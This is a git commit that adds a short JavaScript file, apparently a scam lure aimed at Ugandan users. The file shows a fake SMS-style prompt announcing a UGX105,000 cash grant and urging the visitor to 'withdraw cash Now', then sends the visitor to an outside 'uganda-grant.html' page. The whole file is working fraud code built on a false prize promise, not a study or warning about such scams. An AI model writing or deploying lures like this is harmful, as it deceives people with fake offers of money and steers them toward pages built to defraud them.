e45cc99d67d415672552cb3526aefcd7acbb0a72
itidnewblog3 <ukpehaitid1@gmail.com>
2025-10-04 14:55:29 +0100

    Create uganda-avtivation.js

---
+++ uganda-avtivation.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW UGX105,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive UGX105,000 cash grant, Press Ok to withdraw cash Now ','WITHDRAW UGX105,000');
+if (password != 'WITHDRAW UGX105,000') {
+location.href='https://lhegit.org/uganda-grant.html';
+}
